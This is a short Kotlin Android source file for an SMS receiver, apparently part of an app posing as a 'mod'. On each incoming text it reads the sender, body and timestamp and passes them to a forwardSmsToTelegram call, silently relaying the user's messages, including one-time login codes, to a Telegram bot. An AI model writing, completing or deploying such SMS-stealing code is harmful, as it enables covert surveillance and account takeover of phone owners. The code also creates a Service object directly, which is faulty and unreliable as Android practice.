package com.example.youmod

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.SmsMessage

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            val bundle: Bundle? = intent.extras
            if (bundle != null) {
                try {
                    val pdus = bundle.get("pdus") as Array<*>
                    for (pdu in pdus) {
                        val format = bundle.getString("format")
                        val sms = SmsMessage.createFromPdu(pdu as ByteArray, format)
                        val sender = sms.displayOriginatingAddress
                        val message = sms.messageBody
                        val timestamp = sms.timestampMillis

                        val serviceIntent = Intent(context, BotService::class.java)
                        context.startService(serviceIntent)

                        val botService = BotService()
                        botService.forwardSmsToTelegram(sender ?: "Unknown", message ?: "", timestamp)
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
    }
}
